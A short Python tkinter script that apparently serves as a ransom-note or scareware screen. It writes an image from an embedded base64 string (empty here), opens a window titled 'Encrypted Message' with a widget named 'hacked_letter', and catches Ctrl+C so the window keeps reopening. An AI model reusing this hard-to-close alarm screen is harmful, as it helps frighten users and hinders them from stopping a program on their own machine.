from tkinter import *
import base64
from PIL import ImageTk, Image
import time

with open('message.png', 'wb') as f:
    f.write(base64.b64decode(b''))
while True:
    try:

        # Create the window.
        window = Tk()
        window.resizable(width=False, height=False)

        window.title('''Encrypted Message''')
        WINDOW_HEIGHT = '480'
        WINDOW_WIDTH = '853'
        window.geometry(WINDOW_WIDTH + 'x' + WINDOW_HEIGHT)
        load = Image.open('message.png')
        render = ImageTk.PhotoImage(load)
        img = Label(window, image=render)
        img.image = render
        img.place(x=0, y=0)
        hacked_letter = Text(window, height=WINDOW_HEIGHT, width=WINDOW_WIDTH)
        mainloop()

    except KeyboardInterrupt:
        continue